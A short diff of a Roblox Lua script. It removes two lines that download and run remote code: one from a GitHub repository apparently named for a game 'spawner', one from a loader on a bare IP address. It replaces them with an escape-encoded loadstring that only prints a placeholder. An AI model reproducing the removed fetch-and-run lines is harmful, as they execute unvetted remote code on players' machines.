@@ -1,4 +1,1 @@
-ID="9cf507ca-e866-4299-9303-1bb7cee4af2e";
-task.delay(15, function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Crypoth/StealABrainRotSpawner/refs/heads/main/XwareSpawner"))() end)
-
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring("\112\114\105\110\116\40\34\32\89\79\85\82\32\83\67\82\73\80\84\32\72\69\82\69\33\33\32\34\41\10")()
